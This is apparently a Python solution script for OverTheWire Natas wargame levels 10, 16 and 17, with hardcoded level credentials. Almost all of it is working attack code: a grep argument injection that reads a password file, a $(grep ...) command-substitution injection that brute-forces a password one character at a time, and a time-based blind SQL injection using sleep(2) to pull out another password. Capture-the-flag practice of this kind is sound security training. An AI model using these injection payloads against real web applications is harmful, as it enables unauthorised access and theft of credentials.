from requests import post, get
from requests.exceptions import RequestException
from requests.auth import HTTPBasicAuth
from datetime import timedelta

alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def get_natas_11_password():
    auth = HTTPBasicAuth("natas10", "D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE")
    payload = 'a /etc/natas_webpass/natas11 '
    response = post("http://natas10.natas.labs.overthewire.org/", data={"needle":payload}, auth=auth).text
    res_list = response.split('\n')
    print(res_list)
    res = [res for res in res_list if not res.startswith("dictionary.txt")]
    print(res)

def get_natas_17_password():
    auth = HTTPBasicAuth("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")
    dictionary = []
    for char in alpha :
        try:
            #had weird behavior passing an f string as query string parameter
            response = get("http://natas16.natas.labs.overthewire.org", params={"needle":"Englishing$(grep "+char+" /etc/natas_webpass/natas17)", "submit":"Search"}, auth=auth)
        except RequestException:
            print("exception thrown")
        # print(response.status_code)
        # print(response.request)
        # print(response.text)
        if "Englishing" not in response.text:
            dictionary.append(char)
    print(dictionary)

    password = []
    while len(password) < 32:
        for char in dictionary:
            password.append(char)
            try:
                response = get("http://natas16.natas.labs.overthewire.org/?needle=Englishing$(grep ^"+"".join(password)+" /etc/natas_webpass/natas17)", auth=auth)
            except RequestException:
                print("exception thrown")
            if "Englishing" in response.text:
                password.pop()
            else:
                print("".join(password))
    # print("".join(password))
            

def get_natas_18_password():
    auth = HTTPBasicAuth("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")
    dictionary = []
    confirmation_time_delta = timedelta(seconds=2.0)
    for char in alpha:
        response = post("http://natas17.natas.labs.overthewire.org/index.php", data={"username": 'natas18" and  password LIKE BINARY "%'+char+'%" AND sleep(2) #'}, auth=auth)
        if response.elapsed >= confirmation_time_delta:
            dictionary.append(char)
        print(dictionary)
    password = []
    for _ in range(32):
        for char in dictionary:
            password.append(char)
            print("password before post", password)
            print("password before post", "".join(password))
            response = post("http://natas17.natas.labs.overthewire.org/index.php",data={"username":'natas18" and password LIKE BINARY "'+"".join(password)+'%" AND sleep(2) #'}, auth=auth)
            if response.elapsed >= confirmation_time_delta:
                break
            else:
                password.pop()
            print("Delta: ", response.elapsed, " Char: ", char)
    print("".join(password))


if __name__ == "__main__":
    get_natas_18_password()
